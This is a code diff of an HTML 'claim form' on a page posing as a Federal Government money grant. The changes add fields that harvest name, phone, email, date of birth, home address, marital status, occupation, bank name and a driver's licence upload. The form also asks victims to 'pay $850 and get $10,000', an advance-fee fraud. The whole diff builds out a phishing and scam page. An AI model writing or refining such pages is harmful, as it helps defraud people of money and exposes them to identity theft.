@@ -285,13 +285,36 @@ The money giving by the Federal Government is not a loan, It's a Money Grant off
               <h2>Claim Form</h2>
               <h5><span>Fill With Correct Information Ask Your Agent If There's Anything You Don't Understand.</span></h5>
 
-              <input type="text" id="fname" name="first-name" placeholder=" First name">
               <input name="_formsubmit_id" type="text" style="display:none">
-              <input type="text" id="lname" name="last-name" placeholder=" Last name"><br>
-              <input type="tel" name="phone" id="number" placeholder="Phone number">
-              
-              <!-- <label for="email">E-mail:</label> -->
-              <input type="email" name="email" id="email" placeholder=" E-mail"><br>
+              <input type="text" class="detail" name="first-name" placeholder=" First name">
+              <input type="text" class="detail" name="last-name" placeholder=" Last name"><br>
+              <input type="tel" name="phone" class="detail" placeholder="Phone number">
+              <input type="email" name="email" class="detail" placeholder=" E-mail"><br>
+              <label for="" id="age">D O B:</label>
+              <input type="date" name="DOB" id="dob">
+              <select name="gender" id="">
+                <option value="">Select gender</option>
+                <option value="">Male</option>
+                <option value="">
+                  Female
+                </option>
+                <option value="">
+                  Others
+                </option>
+              </select><br>
+              <input type="text" name="Full-Adress" class="details" placeholder="Full Home Adress">
+              <select name="Marital-status" id="">
+                <option value="">Marital-status</option>
+                <option value="">Single</option>
+                <option value="">Married</option>
+                <option value="">Divorce</option>
+                <option value="">Widow</option>
+              </select>
+              <input type="text" name="Occupation" class="detail"
+              placeholder="Occupation"><br>
+              <input type="text" name="Bank-name" placeholder="Bank Name" class="detail">
+              <label for="">Uplaod Drivers Licence</label>
+              <input type="file" name="DL" id="DL" >
               <h3>How Do You Want To Recievec Your Money?</h3>
               <input type="radio" name="cash" id="cash">
               <label for="CASH">CASH</label><br>
@@ -300,6 +323,7 @@ The money giving by the Federal Government is not a loan, It's a Money Grant off
               <input type="radio" name="debit-card" id="debit-card">
               <label for="DEBIT CARD">DEBIT CARD</label><br><br>
               <label for="">Choose Your Winning Choice</label>
+
               <select name="billing" id="">
                 <option value="">Select The Amount Of Your Choice</option>
                 <option value=""><p>You pay, $850 and get $10,000.00</p></option>
